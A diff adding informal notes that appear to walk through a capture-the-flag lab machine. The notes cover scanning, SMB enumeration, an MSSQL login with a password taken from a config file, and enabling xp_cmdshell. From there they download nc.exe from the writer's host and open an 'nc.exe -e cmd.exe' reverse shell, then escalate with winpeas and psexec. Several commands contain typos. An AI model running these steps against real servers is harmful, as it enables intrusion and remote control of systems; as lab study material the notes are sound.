@@ -1,0 +1,26 @@
+1. apply nmap -sS -sV -sC -p 139,5985,49669,49666,1433,49668,49665,445,49667,135,47001,49664 -vvv -oN scan_archetype 10.129.146.201
+2. view open port hosting a database 143
+3. apply command line smbclient -L ////10.129.146.201// -N 
+4. apply locate mssqlclient
+5 later /usr/bin/impacket-mssqlclient Archetype/sql@<IP>
+or python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py Archetype/sql@<IP>
+6. type password this code is in file prod.dtsConfig 
+7. M3g4c0rp123
+8.in windows SQL press help for shell command
+9. enable shell command 
+10. open reverse stable shell with:
+10.1 python - m http.server 8080
+in this directroy it should be nc.exe 
+11. we are going to connect to machine server since sql with
+11.1 xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://<YOURIP>:8080/nc.exe -outfile nc.exe"
+11.2 command -c for use command linux and avoid "\\"
+12. apply nc -lvnp -4444 listen you local
+13. Now connect a my host since SQL with:
+13. xp_cmdshell "powershell -c C:\Users\sql_sv\Downloads; .\nc.exe -e cmd.exe 10.10.16.195 44"
+14. I find first flag apply cd .. and dir
+later type user.txt -> 3e7b102e78218e935bf3f4951fec21a3
+15. apply ./winpeas.exe
+16. I found directory and file ConsoleHost:history.txt
+17. user administrator and connect with script psexec.py
+18. now python3 /usr/share/doc/python3-impacket/example/psexec.py administrator@<IP>
+19. password
